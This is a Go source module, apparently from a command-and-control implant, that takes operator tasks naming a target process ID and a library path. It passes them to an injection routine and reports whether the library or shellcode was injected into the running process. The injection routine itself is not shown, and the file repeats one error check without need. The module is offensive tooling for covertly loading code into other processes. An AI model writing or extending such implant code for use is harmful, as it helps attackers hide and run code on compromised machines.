package libinject

import (
	"encoding/json"
	"fmt"
	"log"

	"pkg/utils/structs"
)

// Inject C source taken from: http://www.newosxbook.com/src.jl?tree=listings&file=inject.c
type Injection interface {
	TargetPid() int
	Shellcode() []byte
	Success() bool
	SharedLib() string
}

type Arguments struct {
	PID         int    `json:"pid"`
	LibraryPath string `json:"library"`
}

func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
	tMsg := structs.ThreadMsg{}
	tMsg.TaskItem = task

	args := Arguments{}
	err := json.Unmarshal([]byte(task.Params), &args)

	if err != nil {
		tMsg.Error = true
		tMsg.TaskResult = []byte(err.Error())
		threadChannel <- tMsg
		return
	}

	if err != nil {
		tMsg.Error = true
		tMsg.TaskResult = []byte(err.Error())
		threadChannel <- tMsg
		return
	}

	result, err := injectLibrary(args.PID, args.LibraryPath)

	if err != nil {
		log.Println("Failed to inject shellcode:", err.Error())
		tMsg.Error = true
		tMsg.TaskResult = []byte(err.Error())
		threadChannel <- tMsg
		return
	}

	if result.Success() {
		tMsg.TaskResult = []byte(fmt.Sprintf("Successfully injected %s injection into pid: %d ", args.LibraryPath, args.PID))
	} else {
		tMsg.TaskResult = []byte(fmt.Sprintf("Failed to inject %s into pid: %d ", args.LibraryPath, args.PID))
	}

	threadChannel <- tMsg
}
